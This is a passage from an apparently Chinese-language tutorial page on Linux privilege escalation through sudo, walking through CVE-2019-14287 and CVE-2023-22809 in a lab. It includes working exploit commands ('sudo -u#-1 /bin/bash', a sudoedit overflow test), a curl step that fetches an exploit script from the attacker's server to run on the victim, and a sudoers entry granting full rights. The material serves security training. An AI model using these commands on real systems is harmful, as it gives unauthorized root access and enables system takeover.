24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240517190032070-1448356282-212e1a7d16421302cb7efc825d94685a.png" width="359" height="93" class="img_ev3q"></p>
<p>这里我们可以看到<strong>sudo</strong>版本是<strong>1.8.16</strong>。</p>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="52在-google-上搜索公开漏洞"><strong><div id="id5.2">5.2、在 Google 上搜索公开漏洞</div></strong><a href="#52在-google-上搜索公开漏洞" class="hash-link" aria-label="52在-google-上搜索公开漏洞的直接链接" title="52在-google-上搜索公开漏洞的直接链接">​</a></h4>
<p>我们的下一步是将其带到 Google 以查看此版本的<strong>sudo</strong>是否有任何漏洞。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240517190030816-257947548-62047686aafd69c097874f1218a4a815.png" width="852" height="747" class="img_ev3q"></p>
<p>这两个页面看起来都很有希望。在第一个网页的描述中，它提到该漏洞会影响 1.8.28 (≤1.8.27) 之前的所有版本。</p>
<p>第二页是<a href="https://www.exploit-db.com/exploits/47502" target="_blank" rel="noopener noreferrer" title="漏洞利用数据库">exploitdb</a>，它看起来与第一页中提到的利用相同。那么让我们从这里开始吧。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240517190030503-286734538-bc943caad17512aef8bc141c27f797bd.png" width="673" height="912" class="img_ev3q"></p>
<p>查看该漏洞，我们可以看到它影响<strong>sudo</strong> <strong>≤1.8.27</strong>的所有版本。</p>
<p>如果有一个<strong>sudo</strong>条目允许当前用户以所有用户身份运行程序并指定 !root（非 root），则可以绕过此非root限制并仍然以 root 身份执行。</p>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="53利用-cve-2019-14287"><strong><div id="id5.3">5.3、利用 CVE-2019-14287</div></strong><a href="#53利用-cve-2019-14287" class="hash-link" aria-label="53利用-cve-2019-14287的直接链接" title="53利用-cve-2019-14287的直接链接">​</a></h4>
<p>检查<strong>sudo -l</strong>输出，我们可以看到当前用户可以使用类似的命令。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240517190030830-1715159588-15b574e708717157b425e14e99e0042a.png" width="512" height="151" class="img_ev3q"></p>
<p>该条目表示我们当前的用户可以以任何非root身份运行/bin/bash，而无需指定任何用户的密码。</p>
<p>但是，如果我们遵循漏洞利用示例，我们可以运行以下命令来绕过此限制并以 root 身份执行/bin/bash。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">sudo -u#-1 /bin/bash</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240517190030655-1821766562-12485bc512986e129e40f357fb881a82.png" width="385" height="73" class="img_ev3q"></p>
<p>Cool！这表明，当我们传递 UID -1 时sudo会感到困惑。</p>
<p>由于 UID -1 不存在，因此程序会自动使用下一个存在的 UID，即“0”或最终的 root。</p>
<h2 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="6利用-sudo-命令--sudo-版本-1912p1-cve-2023-22809"><strong><div id="id6">6、利用 Sudo 命令 – Sudo 版本 ≤1.9.12p1 (CVE-2023-22809)</div></strong><a href="#6利用-sudo-命令--sudo-版本-1912p1-cve-2023-22809" class="hash-link" aria-label="6利用-sudo-命令--sudo-版本-1912p1-cve-2023-22809的直接链接" title="6利用-sudo-命令--sudo-版本-1912p1-cve-2023-22809的直接链接">​</a></h2>
<p>对于我们的最后一个示例，我们将回顾一个新的漏洞（在撰写本文时）：CVE-2023-22809。</p>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="61了解-sudoedit-是如何工作的"><strong><div id="id6.1">6.1、了解 sudoedit 是如何工作的</div></strong><a href="#61了解-sudoedit-是如何工作的" class="hash-link" aria-label="61了解-sudoedit-是如何工作的的直接链接" title="61了解-sudoedit-是如何工作的的直接链接">​</a></h4>
<p>早些时候，当我们运行<strong>sudo -l</strong>时，输出显示了一个使用<strong>sudoedit</strong>的命令。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240517190030866-104290415-ae830bf902e29600ddd6b2ea73d181ec.png" width="510" height="144" class="img_ev3q"></p>
<p><strong>sudoedit</strong>类似于<strong>sudo -e</strong>，这是<strong>sudo</strong>提供的一种只用来编辑文件而不是执行文件的方式。</p>
<p>因为<strong>sudoedit</strong>相当于<strong>sudo -e</strong>，所以当我们运行此命令时，我们不会将<strong>s</strong> udo 添加到它的开头，因为sudo已经隐含了。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">sudoedit /etc/apache2/apache2.conf</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>运行上述命令将创建apache2.conf文件的副本，其是以当前用户身份打开它而不是 root，保存时会用该副本覆盖现有文件。</p>
<p>这与使用具有sudo权限的文本编辑器（例如sudo vim ）不同，后者实际上以 root 身份打开文件。</p>
<blockquote>
<p>注意：在下一个示例中，我们需要知道当前用户的密码，因为没有指定 NOPASSWD。我用 NOPASSWD 测试了这个漏洞，但没有成功。也许这是一种快速的修补方法？- 我不知道......也许最好升级到最新版本。</p>
</blockquote>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="62在-google-上搜索公开漏洞"><strong><div id="id6.2">6.2、在 Google 上搜索公开漏洞</div></strong><a href="#62在-google-上搜索公开漏洞" class="hash-link" aria-label="62在-google-上搜索公开漏洞的直接链接" title="62在-google-上搜索公开漏洞的直接链接">​</a></h4>
<p>由于安全研究人员最近披露了此漏洞，并影响广泛的sudo版本（1.8.0 至 1.9.12p1），因此在 Google 搜索<strong>sudoedit</strong>漏洞时会立即出现该漏洞。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240517190030778-996651875-b20790a48003a8c86b65cf0a0c498a4a.png" width="846" height="408" class="img_ev3q"></p>
<p>在这里我们可以看到两个有趣的 CVE 位于搜索结果的顶部。</p>
<p>然而，让我们假装我们还不知道我们在寻找什么……好吧，在这种情况下，我们可能会先测试最上面的一个。</p>
<p><a href="https://github.com/CyberCommands/exploit-sudoedit" target="_blank" rel="noopener noreferrer">检查这里的</a>GitHub链接，我们可以看到有一个测试命令来查看主机是否存在漏洞。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240517190030315-128630745-0c91691b611d4e55e66d578a666296a1.png" width="849" height="227" class="img_ev3q"></p>
<p>我们自己测试一下，希望能得到一个分段错误。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">sudoedit -s &#x27;\&#x27; `perl -e &#x27;print &quot;A&quot; x 65536&#x27;`</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240517190030607-1656703952-097446725f875da1151b926274387eb2.png" width="848" height="49" class="img_ev3q"></p>
<p>但是，我们收到“Usage”消息，这表明该版本（1.8.16）不易受到攻击。</p>
<blockquote>
<p>如果您研究 CVE-2021-3156，您会发现该漏洞适用于各种<strong>sudo</strong>版本，但相当不一致：“影响 sudo 旧版本 1.8.2 到 1.8.31p2 以及稳定版本 1.9.x 到 1.9.5p1</p>
</blockquote>
<p>看起来我们的版本正好低于易受攻击的版本。</p>
<p>好吧，继续，接下来我们可以查看第二个漏洞利用的<a href="https://github.com/n3m1dotsys/CVE-2023-22809-sudoedit-privesc" target="_blank" rel="noopener noreferrer">链接</a></p>
<p>我们立刻就可以看到这个看起来更有前途。它涵盖了更广泛的版本，包括受害者上的版本，并且还影响该范围内的所有版本。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240517190030707-754099611-963ba0d1af0b738c54288b9090ea2779.png" width="901" height="237" class="img_ev3q"></p>
<p>由于这看起来不错，让我们继续在攻击者计算机上获取一份副本，然后查看脚本。</p>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="63查看-cve-2023-22809-漏洞利用脚本"><strong><div id="id6.3">6.3、查看 CVE-2023-22809 漏洞利用脚本</div></strong><a href="#63查看-cve-2023-22809-漏洞利用脚本" class="hash-link" aria-label="63查看-cve-2023-22809-漏洞利用脚本的直接链接" title="63查看-cve-2023-22809-漏洞利用脚本的直接链接">​</a></h4>
<p>将脚本复制到攻击者计算机上后，我们可以看看它做了什么。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240517190033703-481819274-a4edb44cd1d0e8688800a9ef2d07f85a.png" width="924" height="734" class="img_ev3q"></p>
<p>在这里我们可以看到脚本通过检查<strong>sudo</strong>版本来启动。接下来，它创建变量“EXPLOITABLE”，然后使用它来检查用户是否可以以 root 身份运行<strong>sudoedit</strong>。</p>
<p>如果两项检查均成功，则程序会通过强制编辑任意文件（本例编辑的是sudoers 文件）而不是<strong>sudo -l</strong>输出中指定的文件来利用<strong>sudoedit</strong>。</p>
<blockquote>
<p>在 1.9.12p2 之前的 Sudo 中，sudoedit（又名 -e）功能会错误处理用户提供的环境变量（SUDO_EDITOR、VISUAL 和 EDITOR）中传递的额外参数，从而允许本地攻击者在要利用的文本文件中添加任意条目。这可能导致权限升级，受影响的版本为 1.8.0 至 1.9.12.p1。该问题存在的原因是用户指定的编辑器可能包含一个会破坏保护机制的&quot;-&quot;参数，例如 EDITOR=&#x27;vim - /path/to/extra/file&#x27; 值。</p>
</blockquote>
<p>伟大的！现在我们了解了这个漏洞的作用，让我们用它来获取 root shell！</p>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="64利用-cve-2023-22809"><strong><div id="id6.4">6.4、利用 CVE-2023-22809</div></strong><a href="#64利用-cve-2023-22809" class="hash-link" aria-label="64利用-cve-2023-22809的直接链接" title="64利用-cve-2023-22809的直接链接">​</a></h4>
<p>好吧，由于我们的 HTTP 服务器仍在运行，我们可以将漏洞利用程序下载到受害者身上并为权限升级做好准备。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">curl 172.16.1.30/CVE-2023-22809.sh -o /tmp/CVE-2023-22809.sh</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">chmod 755 /tmp/CVE-2023-22809.sh</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240517190031189-1788951911-bab20734e4c0cbde6439d9724749acea.png" width="957" height="221" class="img_ev3q"></p>
<p>在转移漏洞并赋予其执行权限后，剩下要做的就是运行它并希望获得 root shell。</p>
<p>真相时刻……</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">/tmp/CVE-2023-22809.sh</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240517190030819-1866384886-a3039183710b0c9bd1fe362401ed3065.png" width="761" height="96" class="img_ev3q"></p>
<p>这向我们表明用户很容易受到攻击，并要求我们按任意键继续。只需按 [Enter]，<strong>sudoers</strong>文件就会打开并可编辑。</p>
<p>此时，我们所要做的就是添加以下行以提供完整的<strong>sudo</strong>权限。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">cain    ALL=(ALL:ALL) ALL</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240517190031115-1874524774-a0441ef12e74f2d820a3d23bd3d62a1a.png" width="813" height="652" class="img_ev3q"></p>
<p>由于这是vim ，在我们添加行并解锁sudo的全部潜力后，我们需要按<strong>CTRL + C</strong>退出“编辑模式”，然后输入<strong>wq!</strong> 强制保存更改。</p>
<p>完成后，我们应该发现我们已自动进入 root shell，因为漏洞利用是通过运行<strong>sudo su</strong>完成的。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240517190031571-1735582475-45652f117e21ea09f5cb5aee43f95359.png" width="854" height="187" class="img_ev3q"></p>
<p>Awesome！它是有效的，我们能够成功编辑<strong>sudoers</strong>文件，即使我们没有这样做的权限！</p></div></article><nav class="pagination-nav docusaurus-mt-lg" aria-label="文件选项卡"><a class="pagination-nav__link pagination-nav__link--prev" href="/web/docs/渗透/Linux 提权/Linux 提权-Sudo_1"><div class="pagination-nav__sublabel">上一页</div><div class="pagination-nav__label">Linux 提权-Sudo_1</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/web/docs/渗透/Linux 提权/Linux 提权-内核利用"><div class="pagination-nav__sublabel">下一页</div><div class="pagination-nav__label">Linux 提权-内核利用</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#导航" class="table-of-contents__link toc-highlight">导航</a></li><li><a href="#0前言" class="table-of-contents__link toc-highlight"><strong><div>0、前言</div></strong></a></li><li><a href="#1第-1-部分快速回顾" class="table-of-contents__link toc-highlight"><strong><div>1、第 1 部分快速回顾</div></strong></a></li><li><a href="#2利用-sudo-命令--滥用预期功能" class="table-of-contents__link toc-highlight"><strong><div>2、利用 Sudo 命令 – 滥用预期功能</div></strong></a></li><li><a href="#3利用-sudo-命令--ld_preload-注入" class="table-of-contents__link toc-highlight"><strong><div>3、利用 Sudo 命令 – LD_PRELOAD 注入</div></strong></a></li><li><a href="#4利用-sudo-命令--sudo-令牌重用" class="table-of-contents__link toc-highlight"><strong><div>4、利用 Sudo 命令 – Sudo 令牌重用</div></strong></a></li><li><a href="#5利用-sudo-命令--sudo-版本-1827-cve-2019-14287" class="table-of-contents__link toc-highlight"><strong><div>5、利用 Sudo 命令 – Sudo 版本 ≤1.8.27 (CVE-2019-14287)</div></strong></a></li><li><a href="#6利用-sudo-命令--sudo-版本-1912p1-cve-2023-22809" class="table-of-contents__link toc-highlight"><strong><div>6、利用 Sudo 命令 – Sudo 版本 ≤1.9.12p1 (CVE-2023-22809)</div></strong></a></li></ul></div></div></div></div></main></div></div></div><footer class="footer footer--dark"><div class="container container-fluid"><div class="footer__bottom text--center"><div class="margin-bottom--sm"><a href="https://www.cnblogs.com/kqdssheng" rel="noopener noreferrer" class="footerLogoLink_BH7S"><img src="/web/img/logo.svg" alt="博客园" class="footer__logo themedComponent_mlkZ themedComponent--light_NVdE" width="30" height="30"><img src="/web/img/logo.svg" alt="博客园" class="footer__logo themedComponent_mlkZ themedComponent--dark_xIcU" width="30" height="30"></a></div></div></div></footer></div>
</body>
</html>